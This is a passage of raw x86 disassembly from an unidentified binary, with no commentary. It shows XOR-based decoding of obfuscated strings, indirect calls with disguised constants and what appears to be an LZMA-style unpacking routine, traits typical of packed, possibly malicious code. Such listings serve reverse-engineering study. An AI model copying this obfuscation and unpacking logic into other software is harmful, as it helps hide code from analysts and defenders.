  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
